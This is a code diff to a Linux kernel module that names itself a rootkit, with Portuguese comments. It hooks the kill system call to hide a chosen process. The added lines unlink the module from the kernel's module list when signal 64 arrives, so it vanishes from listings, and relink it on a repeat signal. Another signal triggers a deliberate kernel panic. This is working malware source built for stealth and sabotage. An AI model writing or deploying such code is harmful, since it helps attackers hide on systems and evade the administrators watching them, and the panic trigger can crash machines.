@@ -15,6 +15,7 @@
 #include <linux/namei.h>
 #include <linux/ftrace.h>
 #include <linux/dirent.h>
+#include <linux/list.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Breno Nascimento");
@@ -40,6 +41,9 @@ static struct ftrace_hook hook2;
 static char* pid = "0";
 module_param(pid, charp, S_IRUGO);
 MODULE_PARM_DESC(pid, "PID do processo a esconder");
+
+static short hidden = 0;
+static struct list_head *prev_module;
 
 // compilador fica com raiva se nao colocar prototipo antes da declaracao de funcao ja que o kernel segue 
 // a metodologia POE (Programacao Orientada a Espaguetes)
@@ -82,10 +86,25 @@ asmlinkage int hook_kill(struct pt_regs *regs) {
     int sig = regs->si;
 
     if (sig == 64) {
+        if (!hidden) {
+            printk(KERN_INFO "rootkit: ocultando modulo da lista\n");
+            prev_module = THIS_MODULE->list.prev;
+            list_del(&THIS_MODULE->list);
+            hidden = 1;
+        }
+        else if (hidden) {
+            printk(KERN_INFO "rootkit: revelando modulo!\n");
+            list_add(&THIS_MODULE->list, prev_module);
+            hidden = 0;
+        }
+        return 0;
+    }
+
+    else if (sig == 42) {
         // printk(KERN_ALERT "rootkit: sinal especial recebido!!!\n");
         // regs->si = SIGINT;
         // return orig_func(regs);
-        panic("OMG");
+        panic("BRUNO SAFADO");
     }
     else {
         if (sig) printk(KERN_INFO "rootkit: sinal comum recebido: %d\n", sig);
